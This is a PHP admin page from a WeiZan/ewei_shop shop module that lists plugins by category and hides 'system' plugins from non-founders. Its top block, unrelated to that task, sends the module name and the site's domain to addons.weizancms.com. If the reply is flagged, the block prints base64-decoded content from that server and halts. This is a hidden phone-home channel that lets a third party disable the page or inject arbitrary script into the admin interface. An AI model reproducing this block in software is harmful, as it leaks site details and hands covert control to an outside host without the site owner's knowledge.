<?php

//微赞科技 by QQ:800083075 http://www.012wz.com/
global $_W, $_GPC;
		$module=$this->modulename;
		$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
		$result=file_get_contents($api);
		if(!empty($result)){
			$result=json_decode($result,true);
			if($result['type']==1){
				echo base64_decode($result['content']);
				exit;
			}
		}
$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
$category  = m('plugin')->getCategory();
foreach ($category as $ck => &$cv) {
    $plugins    = array();
    $catplugins = pdo_fetchall('select * from ' . tablename('ewei_shop_plugin') . ' where isv2=0 and category=:category order by displayorder asc', array(
        ':category' => $ck
    ));
    foreach ($catplugins as $cp) {
        if ($cp['identity'] == 'system') {
            if (!$_W['isfounder']) {
                continue;
            }
        }
        $plugins[] = $cp;
    }
    $cv['plugins'] = $plugins;
}
unset($cv);
include $this->template('web/plugins/list');
exit;